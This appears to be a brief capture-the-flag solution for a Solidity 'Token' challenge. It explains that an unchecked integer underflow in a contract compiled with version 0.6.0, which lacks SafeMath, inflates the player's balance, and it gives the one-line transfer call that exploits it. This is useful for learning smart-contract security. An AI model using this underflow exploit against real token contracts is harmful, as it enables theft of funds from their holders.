# Token

As this contract was compiled with version `0.6.0` and does not includer OZ safeMath (which is a know issue at this version - no longer available w/ current compiler versions) we can use an underflow to increase the player balance. 

`await contract.transfer('0x2083d8f8a8a9358c307592b215134df944a7ecff', 21)`